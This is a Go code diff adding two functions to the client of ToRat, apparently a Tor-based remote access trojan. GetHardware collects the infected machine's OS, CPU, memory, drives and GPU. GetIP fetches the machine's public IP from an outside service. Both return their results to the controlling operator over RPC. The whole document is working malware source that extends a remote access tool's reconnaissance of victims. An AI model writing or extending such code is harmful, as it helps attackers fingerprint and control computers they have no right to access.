@@ -7,11 +7,14 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
 	"net/rpc"
 	"os"
 	"path/filepath"
 	"reflect"
+	"runtime"
 
+	"github.com/jaypipes/ghw"
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/cat"
@@ -122,6 +125,45 @@ func (a *API) Cd(path string, r *shared.Dir) (err error) {
 	r.Path = cwd
 	r.Files, err = filepath.Glob("*")
 	return err
+}
+
+//
+// Hardware Survey Section
+//
+
+func (a *API) GetHardware(v shared.Void, r *shared.Hardware) error {
+	cpu, _ := ghw.CPU()
+	memory, _ := ghw.Memory()
+	block, _ := ghw.Block()
+	gpu, _ := ghw.GPU()
+
+	r.OS = runtime.GOOS
+	r.Cores = cpu.TotalThreads
+	r.RAM = memory.String()
+	r.Drives = block.String()
+	r.GPU = gpu.String()
+
+	for _, proc := range cpu.Processors {
+		r.CPU = proc.Vendor + proc.Model
+	}
+
+	return nil
+}
+
+func (a *API) GetIP(v shared.Void, r *string) error {
+	url := "https://api.ipify.org?format=text"
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	ip, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return err
+	}
+
+	*r = string(ip)
+	return nil
 }
 
 // Make sure API is never garbled.
